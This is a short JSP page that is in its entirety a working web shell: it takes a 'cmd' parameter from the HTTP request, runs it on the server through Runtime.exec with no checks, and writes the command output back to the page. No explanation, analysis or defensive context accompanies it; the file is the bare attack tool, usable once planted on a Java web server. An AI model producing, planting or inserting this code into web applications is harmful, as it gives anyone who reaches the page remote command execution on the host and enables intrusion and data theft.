<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        String s = null;
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
        while ((s = sI.readLine()) != null) {
            out.println(s);
        }
    }
%>

